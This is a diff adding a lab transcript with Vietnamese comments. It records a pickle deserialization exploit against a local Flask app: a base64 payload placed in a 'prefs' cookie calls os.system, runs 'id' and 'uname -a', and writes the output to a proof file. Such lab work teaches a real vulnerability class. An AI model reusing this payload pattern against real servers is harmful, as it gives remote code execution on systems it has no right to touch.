@@ -1,0 +1,19 @@
+# Transcript lab 8.2 - pickle insecure deserialization -> RCE (chay that 2026-10-18 17:26)
+# App: Flask 127.0.0.1:8065 | Exploit: python3 exploit.py
+
+=== [0] Luong binh thuong: lay cookie prefs mac dinh ===
+Set-Cookie: prefs=gASVIQAAAAAAAAB9lCiMBXRoZW1llIwFbGlnaHSUjARsYW5nlIwCdmmUdS4=; Path=/
+Giai ma prefs mac dinh: Prefs cua ban: {'theme': 'light', 'lang': 'vi'}
+
+=== [1] Tao payload pickle doc hai (__reduce__ -> os.system) ===
+Payload base64: gASViQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjG5pZCA+IC90bXAvbGFiODJfcHJvb2YudHh0IDI+JjE7IGVjaG8gJy0tLSB1bmFtZSAtLS0nID4+IC90bXAvbGFiODJfcHJvb2YudHh0OyB1bmFtZSAtYSA+PiAvdG1wL2xhYjgyX3Byb29mLnR4dJSFlFKULg==
+
+=== [2] Gui cookie prefs = payload -> server pickle.loads -> RCE ===
+Server tra ve: Prefs cua ban: 0 (0 = exit code cua os.system)
+
+=== [3] Doc file bang chung /tmp/lab82_proof.txt (lenh da chay THAT) ===
+uid=1000(haipanda) gid=1000(Administrator) groups=1000(Administrator),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
+--- uname ---
+Linux Haind 6.18.54.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Tue Oct  6 19:13:07 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+
+=== DONE ===
